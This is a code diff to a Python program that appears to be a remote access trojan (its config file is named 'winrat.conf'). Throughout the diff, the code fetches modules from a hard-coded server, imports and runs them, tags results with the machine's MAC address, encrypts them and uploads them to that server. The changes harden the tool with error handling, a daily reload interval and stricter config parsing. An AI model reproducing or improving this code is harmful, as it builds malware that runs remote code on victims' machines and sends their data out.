@@ -10,7 +10,7 @@ import encrypt_data
 
 from uuid import getnode as get_mac
 
-SYSTEMRELOADINTERVAL = 40
+SYSTEMRELOADINTERVAL = 86400 #One day reload interval in seconds.
 
 last_reload = time.time()
 module_names = dict()
@@ -18,9 +18,11 @@ download_links = {"http://192.168.1.110:8000/"}
 upload_links = {"http://192.168.1.110:8000/"}
 
 def download_file(link, output_path):
-    #todo
-    # handle requests.get() exceptions
-    r = requests.get(link)
+    try:
+        r = requests.get(link)
+    except requests.exceptions.RequestException as e:
+        return False
+
     if r.status_code != 200:
         print(f"failed to download {link}")
         return False
@@ -41,11 +43,10 @@ def download_configuration():
 
 def update_configuration():
     module_names.clear()
-
     with open("winrat.conf", "r") as conf_file:
         for line in conf_file:
             line = line.strip().split()
-            if not len(line):
+            if len(line) < 2:
                 continue
             typ = line[0]
             val = line[1]
@@ -77,7 +78,6 @@ def create_file_name(name):
     file_name = hex(get_mac())[2:] + "_" + hex(int(time.time()))[2:] + "_" + name
     return ("O" + file_name)
 
-#move this function to util file
 def upload_result(file_name):
     # check if the file is already encrypted
     encrypt_data.encrypt_file(f"data/{file_name}")
@@ -93,7 +93,6 @@ def upload_result(file_name):
 def store_result(file_name, data):
     if data is None:
         return
-
     if not os.path.isdir("data"):
         os.makedirs("data")
     with open(f"data/{file_name}", "wb") as file:
@@ -106,7 +105,6 @@ def get_module_reload_time(r_time):
 
     if r_time == 0:
         return -1
-
     if time.time() + r_time < next_reload:
         reload_time = r_time 
     else:
@@ -134,15 +132,11 @@ def module_runner(mod, name):
             store_result(file_name, result)
         else:
             file_name = result.split(":")[1]
-
         upload_successful = upload_result(file_name)
         if upload_successful:
             os.remove(f"data/{file_name}")
 
 def load_modules():
-    #todo
-    # delete the source files after imported successfully
-    # disimport the running modules which are not in the modules list  
     for name in module_names:
         importlib.invalidate_caches()
         mod = importlib.import_module(f"modules.{name}")
